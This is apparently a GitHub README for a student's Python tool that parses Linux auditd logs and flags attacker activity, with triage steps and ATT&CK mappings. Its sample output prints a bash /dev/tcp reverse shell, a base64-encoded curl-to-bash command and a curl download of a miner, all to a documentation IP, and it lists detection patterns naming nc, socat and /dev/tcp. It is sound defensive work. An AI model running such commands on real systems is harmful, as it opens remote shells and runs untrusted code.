# Linux Auditd Analyzer

Python script that reads the Linux audit log (auditd) and finds reverse shells, encoded commands, programs run from temp folders, changes to passwd and shadow, new accounts and audit tampering. I made it because auditd shows what really ran on a Linux server, and I wanted to learn how to read it.

## What it does
- Reads `/var/log/audit/audit.log` and joins the SYSCALL, EXECVE, PATH and other lines of one event together
- Finds reverse shells (`/dev/tcp`, `nc -e`, socat)
- Finds encoded commands (`base64 -d | sh`) and download and run (`curl | sh`, files saved to /tmp)
- Finds programs started from /tmp, /dev/shm and /var/tmp
- Finds changes to /etc/passwd, /etc/shadow, /etc/sudoers and sshd_config by programs that are not admin tools (useradd, usermod, passwd, visudo)
- Finds new users and groups, cron persistence, and audit rules being removed or audit being turned off
- Finds one user with many denied file accesses (5+)
- Shows a severity and the MITRE ATT&CK ID for each alert
- Exit code is 1 when something is found, `--json` gives JSON output
- Only uses the Python standard library

## How to run
```
git clone https://github.com/Satish-R01/Cybersecurity-Projects.git
cd Cybersecurity-Projects/16-Linux-Auditd-Analyzer

python3 auditd_analyzer.py samples/audit.log
python3 auditd_analyzer.py samples/audit.log -d 3
sudo python3 auditd_analyzer.py /var/log/audit/audit.log --json
```

Options:
- `-d` denied calls before an alert (default 5)
- `--json` print alerts as JSON

## Output on the sample log
```
$ python3 auditd_analyzer.py samples/audit.log
[*] 73 audit events read
[!] 9 alert(s) found

SEVERITY  TYPE                   EVENT    USER        MITRE      DETAIL
----------------------------------------------------------------------------------------------------
HIGH      Audit tampering        1070     auid=1001   T1562.001  audit was turned off or a rule was removed
HIGH      Download and run       1057     auid=1001   T1105      curl -o /tmp/.x http://203.0.113.50/miner
HIGH      Encoded command        1056     auid=1001   T1027      bash -c echo aWQgPiAvdG1wL3gudHh0OyBjdXJsIGh0dHA6Ly8yMDMuMC4xMTMuNTAvYSB8IGJhc2g= | base64
HIGH      Reverse shell          1055     auid=1001   T1059.004  bash -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1
HIGH      Run from temp folder   1058     auid=1001   T1036      /tmp/.x
HIGH      Sensitive file changed 1060     auid=1001   T1098      /etc/shadow changed by /usr/bin/vim.basic
MEDIUM    Cron persistence       1059     auid=1001   T1053.003  crontab -
MEDIUM    Many denied accesses   -        auid=1002   T1083      7 denied calls, 7 different files
MEDIUM    New account            1062     auid=1001   T1136.001  ADD_USER backup2
```

The sample log is made up, 202 lines and 73 events. It has:
- normal commands like ls, apt update and git pull, which should not alert
- user 1001 running a bash reverse shell to 203.0.113.50
- an encoded command piped to sh, and a miner saved to /tmp/.x and then run
- a crontab change and a new user called backup2
- /etc/shadow edited with vim, and /etc/passwd changed by usermod (this one is allowed)
- user 1002 trying to read 7 protected files and getting permission denied
- user 1000 with only 3 denied reads, which is under the limit
- an audit rule being removed

## What I'd do as L1 after an alert
- Check the auid. It is the real login user, even after sudo or su
- Look at the full event with `ausearch -a <event id>` and see the parent process and the working folder
- For a reverse shell, find the outside IP on VirusTotal and AbuseIPDB, then escalate and isolate the host
- For a changed shadow or a new user, check if there was a change ticket. If not, escalate to L2
- If audit rules were removed, treat it as an attacker hiding, and look at what happened after that time

MITRE ATT&CK: T1059.004 Unix Shell, T1027 Obfuscated Files, T1105 Ingress Tool Transfer, T1036 Masquerading, T1098 Account Manipulation, T1136.001 Create Account, T1053.003 Cron, T1562.001 Disable or Modify Tools.

To prevent it: ship audit logs to a SIEM, make the rules immutable with `-e 2`, and block outbound traffic by default.

## Limitations
- It needs audit rules for the watched files (with keys like identity), otherwise those changes are not logged
- Only plain text audit.log is read, not the ENRICHED format
- Rules are simple text matches, so a changed command can get past
- An admin editing /etc/sudoers with vim will also show up, and I would check it with the ticket

## Tests
```
pip install pytest
python3 -m pytest tests
```

Satish R - https://www.linkedin.com/in/cybersatish
